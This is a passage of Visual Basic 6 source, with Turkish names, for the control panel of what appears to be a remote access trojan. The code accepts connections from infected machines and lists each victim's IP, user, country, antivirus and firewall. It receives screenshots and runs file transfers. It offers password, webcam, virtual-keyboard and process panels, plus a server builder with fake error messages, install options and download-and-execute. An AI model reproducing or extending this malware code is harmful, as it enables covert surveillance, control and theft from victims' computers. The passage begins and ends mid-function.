            r = SetWindowPos(lvwtransfer.hwnd, Me.hwnd, 0, 0, 0, 0, SWP_FLAGS)
        End If
lngfiles.Path = App.Path & "\Language\"
Language.MouseIcon = btn(0).MouseIcon
For sayac = 0 To lngfiles.ListCount - 1
Language.AddItem UCase(Mid(lngfiles.List(sayac), 1, 1)) & Mid(lngfiles.List(sayac), 2, Len(lngfiles.List(sayac)) - 5)
Next
servereditorfakemsjsimgesi = 16
scriptipi(0).MouseIcon = btn(0).MouseIcon
scriptipi(1).MouseIcon = btn(0).MouseIcon
servereditorinstallsi = 2
servereditorservermodesi = 1
cerceveaç (0)
'Call SaydamYap(Me, 230)

End Function

Private Sub Form_Load()
If App.PrevInstance = True Then End
lngfiles.Pattern = "*.lng"
flatayarlar
durumum = True
Open App.Path & "\Settings.ini" For Input As #1
Do While Not EOF(1)
Line Input #1, okunan
progayar.AddItem Mid(okunan, InStr(1, okunan, "=", vbTextCompare) + 1, Len(okunan))
Loop
Close #1

Me.AnimatedGifCtl1.LoadGif True

servereditorservermodesi = "0"
servereditorinstallsi = "2"
servereditorfakemsjsimgesi = "16"

Language.Text = progayar.List(0)
Language_Click

'trayicon True
'Me.Width = 9870
toplamekran = 0
End Sub
Private Sub cikis_Click()
AnimatedGifCtl1.StopTimer
Kill App.Path & "\res.gif"
trayicon False
End
End Sub

Function formayarlari()

For sayac = 1 To lvw.UBound
lvw(sayac).ListItems.Clear
Next
   
    Dim Node

    tvw.Nodes.Clear
    Set Node = tvw.Nodes.Add(, , , dil.List(0), 20, 20)
    Set Node = tvw.Nodes.Add(, , , dil.List(1), 19, 19)
    Set Node = tvw.Nodes.Add(, , , dil.List(2), 23, 23)
    Set Node = tvw.Nodes.Add(, , , dil.List(3), 27, 27)
    
    Set Node = tvw.Nodes.Add(, , , dil.List(4), 40, 40)
    
    
    Set Node = tvw.Nodes.Add(, , , dil.List(5), 13, 13)
    Set Node = tvw.Nodes.Add(, , , dil.List(6), 8, 8)
    Set Node = tvw.Nodes.Add(, , , dil.List(7), 11, 11)
    
    Set Node = tvw.Nodes.Add(, , , dil.List(613), 52, 52) 'komutlar
    
    Set Node = tvw.Nodes.Add(, , , dil.List(8), 5, 5)
    
    Set Node = tvw.Nodes.Add(, , , dil.List(9), 36, 36)
    Set Node = tvw.Nodes.Add(, , , dil.List(595), 24, 24)
    Set Node = tvw.Nodes.Add(, , , dil.List(10), 39, 39)

        Set Node = tvw.Nodes.Add(1, tvwChild, "bir", dil.List(11), 26, 26)
        Set Node = tvw.Nodes.Add(1, tvwChild, "iki", dil.List(12), 25, 25)
        
        Set Node = tvw.Nodes.Add(2, tvwChild, "üç", dil.List(13), 18, 18)
                
        Set Node = tvw.Nodes.Add(3, tvwChild, "dört", dil.List(14), 24, 24)
        'Set Node = tvw.Nodes.Add(3, tvwChild, "beþ", dil.List(15), 38, 38)
        Set Node = tvw.Nodes.Add(3, tvwChild, "otuz", dil.List(634), 53, 53) 'siteden yükleme
        
        Set Node = tvw.Nodes.Add(4, tvwChild, "altý", dil.List(16), 28, 28)
        Set Node = tvw.Nodes.Add(4, tvwChild, "yedi", dil.List(17), 29, 29)
        Set Node = tvw.Nodes.Add(4, tvwChild, "sekiz", dil.List(18), 30, 30)
        
        Set Node = tvw.Nodes.Add(5, tvwChild, "yirmibeþ", dil.List(19), 47, 47)
        Set Node = tvw.Nodes.Add(5, tvwChild, "yirmiuc", dil.List(20), 45, 45)
        Set Node = tvw.Nodes.Add(5, tvwChild, "yirmidort", dil.List(21), 46, 46)
        Set Node = tvw.Nodes.Add(5, tvwChild, "yirmialti", dil.List(22), 11, 11)
        

        'Set Node = tvw.Nodes.Add(6, tvwChild, "dokuz", dil.List(23), 34, 34)
        Set Node = tvw.Nodes.Add(6, tvwChild, "on", dil.List(24), 16, 16)
        Set Node = tvw.Nodes.Add(6, tvwChild, "onbir", dil.List(25), 15, 15)
        Set Node = tvw.Nodes.Add(6, tvwChild, "oniki", dil.List(26), 17, 17)
        'Set Node = tvw.Nodes.Add(6, tvwChild, "onüç", dil.List(27), 4, 4)
        Set Node = tvw.Nodes.Add(6, tvwChild, "yirmisekiz", LCase(dil.List(598)), 50, 50)
        Set Node = tvw.Nodes.Add(6, tvwChild, "onaltý", dil.List(30), 35, 35)
        
        
        Set Node = tvw.Nodes.Add(7, tvwChild, "ondört", dil.List(28), 37, 37)
        Set Node = tvw.Nodes.Add(7, tvwChild, "onbeþ", dil.List(29), 33, 33)
        
        Set Node = tvw.Nodes.Add(8, tvwChild, "onyedi", dil.List(31), 12, 12)
        
        Set Node = tvw.Nodes.Add(9, tvwChild, "yirmidokuz", dil.List(614), 51, 51)
        'Set Node = tvw.Nodes.Add(9, tvwChild, "otuzbir", dil.List(640), 16, 16)

        Set Node = tvw.Nodes.Add(10, tvwChild, "onsekiz", dil.List(32), 7, 7)
        Set Node = tvw.Nodes.Add(10, tvwChild, "ondokuz", dil.List(33), 6, 6)
               
        Set Node = tvw.Nodes.Add(11, tvwChild, "yirmi", dil.List(34), 10, 10)
                
        Set Node = tvw.Nodes.Add(12, tvwChild, "yirmiyedi", LCase(dil.List(92)), 13, 13)
        
        Set Node = tvw.Nodes.Add(13, tvwChild, "yirmibir", dil.List(35), 22, 22)
        Set Node = tvw.Nodes.Add(13, tvwChild, "yirmiiki", dil.List(36), 21, 21)
        
For sayac = 0 To 49
    lbl(sayac).Caption = dil.List(37 + sayac)
Next

For sayac = 0 To 127
    btn(sayac).ToolTipText = dil.List(sayac + 88)
Next

For sayac = 0 To 26
    fun(sayac).Caption = dil.List(sayac + 216)
Next

For sayac = 1 To 9
    lvw(0).ColumnHeaders(sayac).Text = dil.List(sayac + 242)
Next

For sayac = 1 To 2
    lvw(1).ColumnHeaders(sayac).Text = dil.List(sayac + 251)
Next

For sayac = 1 To 2
    lvw(2).ColumnHeaders(sayac).Text = dil.List(sayac + 253)
Next

For sayac = 1 To 4
    lvw(3).ColumnHeaders(sayac).Text = dil.List(sayac + 255)
Next

For sayac = 1 To 5
    lvw(4).ColumnHeaders(sayac).Text = dil.List(sayac + 259)
Next

For sayac = 1 To 5
    lvw(5).ColumnHeaders(sayac).Text = dil.List(sayac + 264)
Next

For sayac = 1 To 5
    lvw(6).ColumnHeaders(sayac).Text = dil.List(sayac + 269)
Next

For sayac = 1 To 2
    lvw(7).ColumnHeaders(sayac).Text = dil.List(sayac + 274)
Next

For sayac = 1 To 2
    lvw(8).ColumnHeaders(sayac).Text = dil.List(sayac + 276)
Next

For sayac = 1 To 1
    lvw(9).ColumnHeaders(sayac).Text = dil.List(278 + sayac)
Next

For sayac = 1 To 5
    lvwtransfer.ColumnHeaders(sayac).Text = dil.List(283 + sayac)
Next

For sayac = 0 To 21
    frmfilemanager.btn(sayac).ToolTipText = dil.List(289 + sayac)
Next

For sayac = 0 To 21
    frmfilemanager.btn(sayac).ToolTipText = dil.List(289 + sayac)
Next

frmfilemanager.lvwdrivers.ColumnHeaders(1).Text = dil.List(311)

For sayac = 1 To 4
    frmfilemanager.lstFiles.ColumnHeaders(sayac).Text = dil.List(311 + sayac)
Next
frmfilemanager.baslik.Caption = dil.List(316)
frmfilemanager.cikis.ToolTipText = dil.List(317)
frmfilemanager.btn(22).ToolTipText = dil.List(585)

lvw(7).ListItems.Add , , dil.List(280), 34, 34
lvw(7).ListItems(1).SubItems(1) = progayar.List(1)
lvw(7).ListItems.Add , , dil.List(281), 34, 34
lvw(7).ListItems(2).SubItems(1) = progayar.List(2)
lvw(7).ListItems.Add , , dil.List(282), 34, 34
lvw(7).ListItems(3).SubItems(1) = progayar.List(3)
lvw(7).ListItems.Add , , dil.List(283), 34, 34
lvw(7).ListItems(4).SubItems(1) = progayar.List(4)

mngoster.Caption = dil.List(318)
mnexit.Caption = dil.List(317)

frmscreen.baslik.Caption = dil.List(319)
frmscreen.btn(0).ToolTipText = dil.List(320)
frmscreen.btn(1).ToolTipText = dil.List(321)
frmscreen.btn(2).ToolTipText = dil.List(323)
frmscreen.btn(3).ToolTipText = dil.List(322)
frmscreen.btn(4).ToolTipText = dil.List(324)
frmscreen.cikis.ToolTipText = dil.List(317)
cikis.ToolTipText = dil.List(317)
simgedurumu.ToolTipText = dil.List(325)

mnstart.Caption = dil.List(586)
mnstop.Caption = dil.List(587)
mnremove.Caption = dil.List(588)
mnclearlist.Caption = dil.List(589)

servereditortxt(1).Text = lvw(7).ListItems(1).SubItems(1)
servereditortxt(2).Text = lvw(7).ListItems(2).SubItems(1)
servereditortxt(3).Text = lvw(7).ListItems(3).SubItems(1)
servereditortxt(4).Text = lvw(7).ListItems(4).SubItems(1)


For sayac = 0 To 3
    chcprinter(sayac).Caption = dil.List(603 + sayac)
Next
    
For sayac = 53 To 56
    lbl(sayac).Caption = dil.List(546 + sayac)
Next

btn(128).ToolTipText = dil.List(607)
btn(129).ToolTipText = dil.List(608)

lbl(58).Caption = dil.List(615)

For sayac = 0 To 2
    btn(sayac + 130).ToolTipText = dil.List(616 + sayac)
Next

For sayac = 59 To 64
    lbl(sayac).Caption = dil.List(621 + sayac - 59)
Next


downloadexecute.Caption = dil.List(627)
downloadexecute.MouseIcon = btn(0).MouseIcon
lbl(65).Caption = dil.List(628)

For sayac = 0 To 7
yuklemedizini(sayac).MouseIcon = btn(0).MouseIcon
Next

For sayac = 0 To 4
nasilcalissin(sayac).MouseIcon = btn(0).MouseIcon
nasilcalissin(sayac).Caption = dil.List(629 + sayac)
Next

btn(133).ToolTipText = dil.List(635)
btn(134).ToolTipText = dil.List(636)

Me.AnimatedGifCtl1.StartTimer
End Function

Private Sub Form_Terminate()
trayicon False
End Sub

Private Sub Form_Unload(Cancel As Integer)
trayicon False
End Sub

Private Sub hazirhatamesajlari_Click()
    txthatamesaji(1).Text = hazirhatamesajlari.Text
End Sub

Private Sub Language_Click()
languagem = Language.Text
diliayarla
formayarlari
End Sub


Private Sub lbl_MouseDown(Index As Integer, Button As Integer, shift As Integer, x As Single, y As Single)
    tasi Me
End Sub

Private Sub lvw_BeforeLabelEdit(Index As Integer, Cancel As Integer)
Cancel = 1
End Sub

Private Sub lvw_DblClick(Index As Integer)

Select Case Index
Case 0
If lvw(0).ListItems.Count < 1 Then Exit Sub

    For sayac = 1 To lvw(0).ListItems.Count
        lvw(0).ListItems(sayac).ForeColor = vbBlack
    Next
    
    lvw(0).SelectedItem.ForeColor = vbRed


    hk 565
    
    lvw(1).ListItems.Clear
    lvw(2).ListItems.Clear
    lvw(3).ListItems.Clear
    lvw(4).ListItems.Clear
    lvw(5).ListItems.Clear
    lvw(6).ListItems.Clear
    lvw(8).ListItems.Clear
    lvw(9).ListItems.Clear
    msngrileti(0).Text = ""
    msngrileti(2).Text = ""
    msngrileti(3).Text = ""
    kimeedicen.Clear
    
    lvwtransfer.ListItems.Clear
    txtsifreler(0).Text = ""
    txtonline.Text = ""
    txtoffline.Text = ""
    txtchat(0).Text = ""
    webcamgoruntu.Picture = Nothing
    
    Unload frmfilemanager
    Unload frmsanalklavye
    Unload frmscreen
    wskscreen.Close
    wsktransfer.Close
    wskwebcam.Close


Case 1
    If lvw(1).ListItems.Count > 1 Then
        Select Case lvw(1).SelectedItem.Key
            Case "jink1", "jink2", "jink3", "jink4", "jink5", "jink6", "jink7"
            serverhaberi = InputBox("New Value", "Server Settings", lvw(1).SelectedItem.SubItems(1))
            If serverhaberi <> "" Then lvw(1).SelectedItem.SubItems(1) = serverhaberi
            
            Case "jink8", "jink9"
            serverhaberi = InputBox("New Value [ 0 or 1 ] ", "Server Settings", lvw(1).SelectedItem.SubItems(1))
            If serverhaberi >= 0 And serverhaberi < 2 And serverhaberi <> "" Then
                If (serverhaberi = 0) And (lvw(1).SelectedItem.Key = "jink8") Then
                    lvw(1).ListItems(lvw(1).SelectedItem.Index + 1).SubItems(1) = Val(serverhaberi) + 1
                    lvw(1).SelectedItem.SubItems(1) = serverhaberi
                End If
                
                If (serverhaberi = 1) And (lvw(1).SelectedItem.Key = "jink8") Then
                    lvw(1).ListItems(lvw(1).SelectedItem.Index + 1).SubItems(1) = Val(serverhaberi) - 1
                    lvw(1).SelectedItem.SubItems(1) = serverhaberi
                End If
                
                If (serverhaberi = 0) And (lvw(1).SelectedItem.Key = "jink9") Then
                    lvw(1).ListItems(lvw(1).SelectedItem.Index - 1).SubItems(1) = Val(serverhaberi) + 1
                    lvw(1).SelectedItem.SubItems(1) = serverhaberi
                End If
                
                If (serverhaberi = 1) And (lvw(1).SelectedItem.Key = "jink9") Then
                    lvw(1).ListItems(lvw(1).SelectedItem.Index - 1).SubItems(1) = Val(serverhaberi) - 1
                    lvw(1).SelectedItem.SubItems(1) = serverhaberi
                End If
            End If
        End Select
    End If





End Select
End Sub

Private Sub Alert(Text As String)
    Dim AlertBox As frmAlert
    Set AlertBox = New frmAlert
    AlertBox.DisplayAlert Text, 3000
   ' Me.SetFocus
End Sub


Private Sub lvw_ItemClick(Index As Integer, ByVal Item As MSComctlLib.ListItem)
Select Case Index
    Case 9
        msngrileti(0).Text = lvw(9).SelectedItem.Text
End Select
End Sub

Private Sub lvwtransfer_BeforeLabelEdit(Cancel As Integer)
Cancel = 1
End Sub

Private Sub lvwtransfer_MouseUp(Button As Integer, shift As Integer, x As Single, y As Single)
If Button = 2 And lvwtransfer.ListItems.Count > 0 Then
    Me.PopupMenu transfermenu
End If
End Sub

Private Sub mnclearlist_Click()
    wsktransfer.Close
    lvwtransfer.ListItems.Clear
End Sub

Private Sub mnexit_Click()
    trayicon False
    End
End Sub

Private Sub mngoster_Click()
    Me.Show
End Sub

Private Sub mnremove_Click()
    lvwtransfer.ListItems.Remove lvwtransfer.SelectedItem.Index
End Sub

Private Sub mnstart_Click()

    wsktransfer.Close
    wsktransfer.LocalPort = lvw(7).ListItems(2).SubItems(1)
    wsktransfer.Listen
    
    Select Case LCase(lvwtransfer.SelectedItem.ListSubItems(4).Text)
        Case "u"
            bilgigonder "[DTPORTAC]0" & Chr(255) & lvwtransfer.SelectedItem.ListSubItems(1).Text
            kayityeri = lvwtransfer.SelectedItem.Text
            bar.Value = 0
            bar.Max = FileLen(lvwtransfer.SelectedItem.Text)
        Case "d"
            bilgigonder "[DTPORTAC]1" & Chr(255) & lvwtransfer.SelectedItem.Text 'ListSubItems(1).Text
            kayityeri = lvwtransfer.SelectedItem.ListSubItems(1).Text
     End Select
     
     transferindex = lvwtransfer.SelectedItem.Index
     transferislem = lvwtransfer.SelectedItem.ListSubItems(4).Text
     aktiftransferwar = True
End Sub

Private Sub mnstop_Click()
    wsktransfer.Close
End Sub

Private Sub nasilcalissin_Click(Index As Integer)
    nasilcalisicaksinbakalim = Index
End Sub

Private Sub ortacerceve_MouseDown(Index As Integer, Button As Integer, shift As Integer, x As Single, y As Single)
    tasi Me
End Sub

Private Sub sahtemsjsimge_Click(Index As Integer)
    For sayac = 0 To 4
        sahtemsjsimge(sayac).ButtonType = 8
    Next
    sahtemsjsimge(Index).ButtonType = 7
    sahtehatamesajýsimgesi = sahtemsjsimge(Index).ToolTipText
End Sub

Private Sub servereditorchc_Click(Index As Integer)
    Select Case Index
        Case 0
            servereditortxt(9).Enabled = Not servereditortxt(9).Enabled
            servereditortxt(10).Enabled = Not servereditortxt(10).Enabled
            servereditorfakemsjsimge(0).Enabled = Not servereditorfakemsjsimge(0).Enabled
            servereditorfakemsjsimge(1).Enabled = Not servereditorfakemsjsimge(1).Enabled
            servereditorfakemsjsimge(2).Enabled = Not servereditorfakemsjsimge(2).Enabled
            servereditorfakemsjsimge(3).Enabled = Not servereditorfakemsjsimge(3).Enabled
            btn(102).Enabled = Not btn(102).Enabled
            
            
        Case 1
        
    End Select

End Sub

Private Sub servereditorfakemsjsimge_Click(Index As Integer)
    servereditorfakemsjsimgesi = servereditorfakemsjsimge(Index).ToolTipText
End Sub

Private Sub servereditorinstall_Click(Index As Integer)
servereditorinstallsi = Index
End Sub

Private Sub servereditorservermode_Click(Index As Integer)
servereditorservermodesi = Index
End Sub

Private Sub simgedurumu_Click()
   trayicon True
   Me.Hide
End Sub




Private Sub sitedenindir_KeyUp(Index As Integer, KeyCode As Integer, shift As Integer)
If Index = 0 Then sitedenindir(1).Text = StripPath(sitedenindir(0).Text)
End Sub

Private Sub taskcon_MouseMove(Button As Integer, shift As Integer, x As Single, y As Single)
If Hex(x) = "1E3C" Then
Me.PopupMenu traymenum
End If
End Sub

Private Sub tmrconcontrol_Timer()
lbl(50).Caption = lvw(0).ListItems.Count
End Sub

Private Sub tuþlar_Click(Index As Integer)
sahtehatamesajýtuslari = Val(tuþlar(Index).ToolTipText)
End Sub

Private Sub tvw_BeforeLabelEdit(Cancel As Integer)
Cancel = 1
End Sub

Private Sub txtchat_Change(Index As Integer)
txtchat(Index).SelLength = Len(txtchat(Index).Text)
End Sub

Private Sub txtchat_KeyPress(Index As Integer, KeyAscii As Integer)
    If Index = 1 And KeyAscii = 13 Then
        bilgigonder "[CHATMESS]" & txtchat(2).Text & " : " & txtchat(1).Text
        txtchat(0).Text = txtchat(0).Text & txtchat(2).Text & " : " & txtchat(1).Text & vbCrLf
        txtchat(1).Text = ""
    End If
End Sub

Sub cerceveaç(Index As Integer)
    For sayac = 0 To ortacerceve.UBound
        ortacerceve(sayac).Visible = False
    Next
    ortacerceve(Index).Left = 2760
    ortacerceve(Index).Top = 360
    ortacerceve(Index).Visible = True
End Sub

Private Sub tvw_NodeClick(ByVal Node As MSComctlLib.Node)
Select Case Node.Key
    Case "bir"
        cerceveaç (1)
    Case "iki"
        cerceveaç (2)
    Case "üç"
        cerceveaç (3)
    Case "dört"
        frmfilemanager.Show , Me
    Case "altý"
        frmsanalklavye.Show
    Case "yedi"
        cerceveaç (7)
    Case "sekiz"
        cerceveaç (8)
    Case "dokuz"
    
    Case "on"
        cerceveaç (9)
    Case "onbir"
        cerceveaç (10)
    Case "oniki"
         cerceveaç (15)
    Case "onüç"
    
    Case "ondört"
        cerceveaç (4)
    Case "onbeþ"
        cerceveaç (5)
    Case "onaltý"
        cerceveaç (6)
    Case "onyedi"
        cerceveaç (12)
    Case "onsekiz"
        frmscreen.Show
    Case "ondokuz"
        cerceveaç (11)
    Case "yirmi"
        cerceveaç (13)
    Case "yirmibir"
        Call ShellExecute(&O0, vbNullString, "http://www.tikkysoft.com", vbNullString, vbNullString, vbNormalFocus)
    Case "yirmiiki"
        cerceveaç (0)
    Case "yirmiuc"
        cerceveaç (16)
    Case "yirmidort"
        cerceveaç (17)
    Case "yirmibeþ"
        cerceveaç (18)
    Case "yirmialti"
        cerceveaç (19)
    Case "yirmiyedi"
        cerceveaç (14)
    Case "yirmisekiz"
        cerceveaç (20)
    Case "yirmidokuz"
        cerceveaç (21)
    Case "otuz"
        cerceveaç (22)
    Case "otuzbir"
        cerceveaç (23)
End Select
End Sub


Private Function GetString(lState As Long, sState As String) As String
Select Case lState
    Case 0 'GetPriority
        Select Case sState
            Case 0: GetString = "Normal"
            Case 1: GetString = "Idle"
            Case 2: GetString = "High"
            Case 3: GetString = "Realtime"
            Case 4: GetString = "-"
        End Select
        
    Case 1 'GetPlacment
        Select Case sState
            Case 1: GetString = "Normal"
            Case 2: GetString = "Minimized"
            Case 3: GetString = "Maximized"
        End Select

    Case 2 ' GetServicState
        Select Case sState
            Case 1: GetString = "Stopped"
            Case 4: GetString = "Running"
            Case 7: GetString = "Paused"
        End Select

    Case 3 ' GetStartup
        Select Case sState
            Case 0: GetString = "Boot"
            Case 1: GetString = "System"
            Case 2: GetString = "Automatic"
            Case 3: GetString = "Manual"
            Case 4: GetString = "Disabled"
        End Select

    Case 4 ' GetDriveType
        Select Case sState
            
            Case 2:
            GetString = "<Removable>"
            sayac = 28
            Case 3:
            GetString = "<Fixed>"
            sayac = 25
            Case 4:
            GetString = "<Remote>"
            sayac = 26
            Case 5:
            GetString = "<CD-Rom>"
            sayac = 24
            Case 6:
            GetString = "<RAM>"
            sayac = 27
        End Select
        
    Case 5 ' GetValueType
        Select Case sState
            Case 1: GetString = "REG_SZ"
            Case 2: GetString = "REG_EXBAND_SZ"
            Case 3: GetString = "REG_BINARY"
            Case 4: GetString = "REG_DWORD"
            Case 7: GetString = "REG_MULTI_SZ"
        End Select
End Select

End Function

Private Function GetFileExtention(sFileExt As String) As String
On Error Resume Next
  sFileExt = Fso.GetExtensionName(sFileExt)
  If Len(sFileExt) = 0 Then GetFileExtention = "File": Exit Function
  GetFileExtention = Reg.regread("HKEY_CLASSES_ROOT\" & Reg.regread("HKEY_CLASSES_ROOT\." & sFileExt & "\") & "\")
  If GetFileExtention = vbNullString Then GetFileExtention = sFileExt & " File"
End Function

Private Function CorrectPath(sPath As String) As String
If Right(sPath, 1) <> "\" Then CorrectPath = sPath & "\"
End Function

Private Function simgebul(ne As String) As Integer
    Select Case LCase(Right(ne, 3))
        Case "doc": simgebul = 1
        Case "xls": simgebul = 2
        Case "mdb": simgebul = 3
        Case "exe", "pif", "com", "scr": simgebul = 4
        Case "inf", "ini": simgebul = 5
        Case "bat": simgebul = 6
        Case "vbs": simgebul = 7
        Case "bak": simgebul = 8
        Case "hlp": simgebul = 9
        Case "ocx", "sys", "dll": simgebul = 10
        Case "htm", "html", "mht": simgebul = 12
        Case "dat": simgebul = 13
        Case "wmp", "avi", "3gp", "rmvb", "divx": simgebul = 14
        Case "cpp": simgebul = 15
        Case "jpg": simgebul = 16
        Case "gif": simgebul = 18
        Case "png": simgebul = 19
        Case "bas": simgebul = 20
        Case "frm": simgebul = 21
        Case "vbp": simgebul = 22
        Case "pdf": simgebul = 29
        Case "msi": simgebul = 30
        Case "psd": simgebul = 31
        Case "rar": simgebul = 32
        Case "swf": simgebul = 34
        Case "ttf": simgebul = 35
        Case "zip": simgebul = 36
        
        
        Case "txt", "log": simgebul = 23
        
        
        
        
        Case Else: simgebul = 8
        
    End Select
End Function

Private Function GetFileAttr(ByVal lAttr As Long) As String
GetFileAttr = IIf(lAttr And vbArchive, "a", "-")
GetFileAttr = GetFileAttr & IIf(lAttr And vbReadOnly, "r", "-")
GetFileAttr = GetFileAttr & IIf(lAttr And vbHidden, "h", "-")
GetFileAttr = GetFileAttr & IIf(lAttr And vbSystem, "s", "-")
GetFileAttr = GetFileAttr & " (" & lAttr & ")"
End Function

Private Function GetDatainHex(sData As String) As String
 Dim lCounter As Long
    If Len(sData) = 0 Then GetDatainHex = "(zero length binary)": Exit Function
    For lCounter = 1 To Len(sData) Step 2
     GetDatainHex = GetDatainHex & LCase(Mid(sData, lCounter, 2)) & " "
    Next
End Function

Private Function GetDatainDWORD(sData As String) As String
    If Len(sData) = 0 Then GetDatainDWORD = "0x00000000 (0)": Exit Function
    GetDatainDWORD = LCase("0x" + String(8 - Len(Hex$(Val(sData))), "0") + Hex$(Val(sData)) + " (" + sData + ")")
End Function


Private Sub wskClient_Close()
    wskClient.Close
    wskClient.LocalPort = lvw(7).ListItems(1).SubItems(1)
    wskClient.Listen
End Sub

Private Sub wskClient_ConnectionRequest(ByVal requestID As Long)
    Load wskServer(wskServer.UBound + 1)
    wskServer(wskServer.UBound).Accept requestID
    DoEvents
    If wskServer(wskServer.UBound).State = sckConnected Then
        wskServer(wskServer.UBound).SendData "[GETSINFO]"
    End If
End Sub

Private Sub wskClient_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
wskClient.Close
wskClient.LocalPort = lvw(7).ListItems(1).SubItems(1)
wskClient.Listen
End Sub

Private Sub wskscreen_Close()
lvw(7).ListItems(3).SmallIcon = 34
End Sub

Private Sub wskscreen_ConnectionRequest(ByVal requestID As Long)
If wskscreen.State <> sckClosed Then wskscreen.Close
 lvw(7).ListItems(3).SmallIcon = 33
 wskscreen.Accept requestID
 bilgigonder "[EKRANBAS]"
End Sub

Private Sub wskscreen_DataArrival(ByVal bytesTotal As Long)
Dim gelen As String
Dim Gecici As String
Dim toplamekran As Long
wskscreen.GetData gelen, vbString

On Local Error Resume Next
toplamekran = toplamekran + Len(gelen)
bar.Value = CInt(toplamekran)

If sDosyaACIKMI = False Then
Open App.Path & "\screen.jpg" For Binary Access Write As #2
sDosyaACIKMI = True
ElseIf sDosyaACIKMI = True Then
End If

If Right(gelen, 17) = "/\/\ENDOFFILE/\/\" Then
    Gecici = Mid(gelen, 1, Len(gelen) - 17)
    Put #2, , Gecici
    Close #2
    frmscreen.picCapture.Picture = LoadPicture(App.Path & "\screen.jpg")
    bar.Value = bar.Max
    sDosyaACIKMI = False
    frmscreen.tekrarla.Enabled = True
    toplamekran = 0
    Exit Sub
Else
Put #2, , gelen
End If

End Sub

Private Sub wskscreen_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
wskscreen.Close
End Sub

Private Sub wskServer_Close(Index As Integer)
On Error Resume Next
wskServer(Index).Close
lvw(0).ListItems.Remove "S:" & Index
End Sub

Private Sub wskServer_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim oItem As ListItem
Dim oNode As Node
Dim sData As String
Dim sHead As String
Dim sMParam() As String
Dim sDParam() As String

    DoEvents
    wskServer(Index).GetData sData
    
'If lvw(7).ListItems(2).SmallIcon <> 33 Or lvw(7).ListItems(3).SmallIcon <> 33 Or lvw(7).ListItems(4).SmallIcon <> 33 Then
'bar.Value = 0
'bar.Max = Val(bytesTotal)
'bar.Value = Val(bytesTotal)
'End If

    Debug.Print sData
If Len(sData) >= 10 Then
    sHead = Left(sData, 10)
    sData = Right(sData, Len(sData) - 10)

    sMParam = Split(sData, Chr(255))
    Select Case sHead

        Case "[SETSINFO]"
                On Local Error Resume Next
                If UBound(sMParam) > 7 Then
                    Set oItem = lvw(0).ListItems.Add(, "S:" & Index, sMParam(0), , LCase(sMParam(8)))
                Else
                    Set oItem = lvw(0).ListItems.Add(, "S:" & Index, sMParam(0), , 229)
                End If

                oItem.SubItems(0) = sMParam(0)
                oItem.SubItems(1) = wskServer(Index).RemoteHostIP
                oItem.SubItems(2) = sMParam(1)
                oItem.SubItems(3) = sMParam(7)
                oItem.SubItems(4) = CBool(sMParam(2))
                oItem.SubItems(5) = sMParam(3)
                oItem.SubItems(6) = sMParam(4)
                oItem.SubItems(7) = FormatKB(Split(sMParam(5), "|")(0))
                oItem.SubItems(8) = sMParam(6)
                Alert sMParam(0) & vbCrLf & dil.List(473)
                lbl(50).Caption = lvw(0).ListItems.Count
        Case "[CHATMESS]"
            txtchat(0).Text = txtchat(0).Text & sData & vbCrLf
            txtchat(0).SelStart = Len(txtchat(0).Text)
            
        Case "[CHATONOF]"
            Select Case sData
                Case 0
                    hk 462
                Case 1
                    hk 463
            End Select
            
        Case "[SETDINFO]"
            lvw(2).ListItems.Clear
            hk 19
            lvw(2).Sorted = False
            lvw(2).ListItems.Add , , "System Info", , 1
            lvw(2).ListItems.Add , , "      Username"
            lvw(2).ListItems.Add , , "      Computer Name"
            lvw(2).ListItems.Add , , "      Windows Version"
            lvw(2).ListItems.Add , , "      Country"
            lvw(2).ListItems.Add , , "      Anti Virus"
            lvw(2).ListItems.Add , , "      Firewall"
            lvw(2).ListItems.Add , , "      Current Directory"
            lvw(2).ListItems.Add , , "      System Drive"
            lvw(2).ListItems.Add , , "      Windows Directory"
            lvw(2).ListItems.Add , , ""
            lvw(2).ListItems.Add , , "Hardware Info", , 2
            lvw(2).ListItems.Add , , "      Processor"
            lvw(2).ListItems.Add , , "      Model"
            lvw(2).ListItems.Add , , "      Total Memory"
            lvw(2).ListItems.Add , , "      Available Memory"
            lvw(2).ListItems.Add , , "      Camera Driver"
            lvw(2).ListItems.Add , , "      Screen Resulation"
            lvw(2).ListItems(2).SubItems(1) = sMParam(0)
            lvw(2).ListItems(3).SubItems(1) = sMParam(1)
            lvw(2).ListItems(4).SubItems(1) = sMParam(2)
            lvw(2).ListItems(5).SubItems(1) = sMParam(3)
            lvw(2).ListItems(6).SubItems(1) = sMParam(4)
            lvw(2).ListItems(7).SubItems(1) = sMParam(5)
            lvw(2).ListItems(8).SubItems(1) = sMParam(6)
            lvw(2).ListItems(9).SubItems(1) = sMParam(7)
            lvw(2).ListItems(10).SubItems(1) = sMParam(8)
            lvw(2).ListItems(13).SubItems(1) = sMParam(9)
            lvw(2).ListItems(14).SubItems(1) = sMParam(10)
            lvw(2).ListItems(15).SubItems(1) = FormatKB(CLng(sMParam(11)))
            lvw(2).ListItems(16).SubItems(1) = FormatKB(CLng(sMParam(12)))
            lvw(2).ListItems(17).SubItems(1) = sMParam(13)
            lvw(2).ListItems(18).SubItems(1) = sMParam(14) & " pixel."
            hk 464
            
        Case "[SETPRCLT]"
            lvw(5).ListItems.Clear
            hk 465
            For i = 0 To UBound(sMParam) - 1
             sDParam = Split(sMParam(i), Chr(0))
             Set oItem = lvw(5).ListItems.Add(, , sDParam(0), , 32)
             oItem.SubItems(1) = sDParam(1)
             oItem.SubItems(2) = sDParam(2)
             oItem.SubItems(3) = sDParam(3)
             oItem.SubItems(4) = GetString(0, sDParam(4))
            Next

        Case "[SETPRGLT]"
            lvw(3).ListItems.Clear
            For i = 0 To UBound(sMParam) - 1
             sDParam = Split(sMParam(i), Chr(0))
             Set oItem = lvw(3).ListItems.Add(, , sDParam(0), , 31)
             oItem.SubItems(1) = IIf(Len(sDParam(1)), sDParam(1), "-")
             oItem.SubItems(2) = IIf(Len(sDParam(2)), sDParam(2), "-")
             oItem.SubItems(3) = IIf(Len(sDParam(3)), sDParam(3), "-")
            Next
            hk 466
        Case "[SETSRVLT]"
 
            For i = 0 To UBound(sMParam) - 1
             sDParam = Split(sMParam(i), Chr(0))
             Set oItem = lvw(4).ListItems.Add(, , sDParam(0), , 5)
